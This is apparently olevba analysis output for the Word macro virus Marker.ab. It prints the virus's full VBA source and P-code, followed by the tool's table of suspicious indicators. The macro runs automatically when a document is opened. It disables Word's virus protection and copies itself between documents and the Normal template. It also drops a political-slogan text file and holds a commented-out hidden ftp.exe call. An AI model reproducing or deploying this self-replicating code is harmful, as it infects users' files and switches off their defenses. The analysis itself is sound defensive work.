olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.ab
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.ab - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
On Error Resume Next

'DECLARATIONS

Dim sViralCode As String, nFreeFile As Integer
Dim oNormal As Object, oDocument As Object, sFileName As String
Dim rRange As Range

Const cIndicator = "INDIA"  ' CONSTANT TO FIND IF THE FILE IS ALREADY INFECTED OR NOT

    Options.VirusProtection = False 'SET VIRUS PROTECTION TO OFF MODE
    nFreeFile = FreeFile

    Randomize
    sFileName = "\India" + Str(32767 * Rnd) + ".txt"
    
    Open CurDir + sFileName For Output As #nFreeFile
        Write #nFreeFile, "Kashmir is an integral part of INDIA. JAI HIND"
    Close #nFreeFile
    
    Set oDocument = ActiveDocument.VBProject.VBComponents.Item(1)
    Set oNormal = NormalTemplate.VBProject.VBComponents.Item(1)
    
    If (oNormal.CodeModule.Find(cIndicator, 1, 1, 999, 999)) = False Then
        sViralCode = oDocument.CodeModule.Lines(1, oDocument.CodeModule.CountOfLines)
        ViralCode = ViralCode & Chr(10)
        oNormal.CodeModule.DeleteLines 1, oNormal.CodeModule.CountOfLines
        oNormal.CodeModule.AddFromString sViralCode
        
    End If

'    Shell "Command.com /c ftp.exe -n -s:" + CurDir + sFileName, vbHide
    
    If (oDocument.CodeModule.Find(cIndicator, 1, 1, 999, 999)) = False Then
        sViralCode = oNormal.CodeModule.Lines(1, oNormal.CodeModule.CountOfLines)
        ViralCode = ViralCode & Chr(10)
        oDocument.CodeModule.DeleteLines 1, oNormal.CodeModule.CountOfLines
        oDocument.CodeModule.AddFromString sViralCode
    End If
    
    ActiveDocument.Save
    NormalTemplate.Save
   
End Sub


' Virus Created By An Indian Citizen



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.ab
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3586 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub Document_Open())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' Line #4:
' 	QuoteRem 0x0000 0x000C "DECLARATIONS"
' Line #5:
' Line #6:
' 	Dim 
' 	VarDefn sViralCode (As String)
' 	VarDefn nFreeFile (As Integer)
' Line #7:
' 	Dim 
' 	VarDefn oNormal (As Object)
' 	VarDefn oDocument (As Object)
' 	VarDefn sFileName (As String)
' Line #8:
' 	Dim 
' 	VarDefn rRange (As Range)
' Line #9:
' Line #10:
' 	Dim (Const) 
' 	LitStr 0x0005 "INDIA"
' 	VarDefn cIndicator
' 	QuoteRem 0x001C 0x0038 " CONSTANT TO FIND IF THE FILE IS ALREADY INFECTED OR NOT"
' Line #11:
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' 	QuoteRem 0x0024 0x0020 "SET VIRUS PROTECTION TO OFF MODE"
' Line #13:
' 	Ld Friend 
' 	St nFreeFile 
' Line #14:
' Line #15:
' 	ArgsCall Read 0x0000 
' Line #16:
' 	LitStr 0x0006 "\India"
' 	LitDI2 0x7FFF 
' 	Ld Rnd 
' 	Mul 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	LitStr 0x0004 ".txt"
' 	Add 
' 	St sFileName 
' Line #17:
' Line #18:
' 	Ld CurDir 
' 	Ld sFileName 
' 	Add 
' 	Ld nFreeFile 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #19:
' 	Ld nFreeFile 
' 	Sharp 
' 	WriteChan 
' 	LitStr 0x002E "Kashmir is an integral part of INDIA. JAI HIND"
' 	PrintItemNL 
' Line #20:
' 	Ld nFreeFile 
' 	Sharp 
' 	Close 0x0001 
' Line #21:
' Line #22:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set oDocument 
' Line #23:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set oNormal 
' Line #24:
' Line #25:
' 	Ld cIndicator 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E7 
' 	LitDI2 0x03E7 
' 	Ld oNormal 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Paren 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #26:
' 	LitDI2 0x0001 
' 	Ld oDocument 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld oDocument 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St sViralCode 
' Line #27:
' 	Ld ViralCode 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St ViralCode 
' Line #28:
' 	LitDI2 0x0001 
' 	Ld oNormal 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld oNormal 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #29:
' 	Ld sViralCode 
' 	Ld oNormal 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #30:
' Line #31:
' 	EndIfBlock 
' Line #32:
' Line #33:
' 	QuoteRem 0x0000 0x0046 "    Shell "Command.com /c ftp.exe -n -s:" + CurDir + sFileName, vbHide"
' Line #34:
' Line #35:
' 	Ld cIndicator 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E7 
' 	LitDI2 0x03E7 
' 	Ld oDocument 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Paren 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #36:
' 	LitDI2 0x0001 
' 	Ld oNormal 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld oNormal 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St sViralCode 
' Line #37:
' 	Ld ViralCode 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St ViralCode 
' Line #38:
' 	LitDI2 0x0001 
' 	Ld oNormal 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld oDocument 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #39:
' 	Ld sViralCode 
' 	Ld oDocument 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #40:
' 	EndIfBlock 
' Line #41:
' Line #42:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #43:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #44:
' Line #45:
' 	EndSub 
' Line #46:
' Line #47:
' Line #48:
' 	QuoteRem 0x0000 0x0023 " Virus Created By An Indian Citizen"
' Line #49:
' Line #50:
' Line #51:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ftp.exe             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

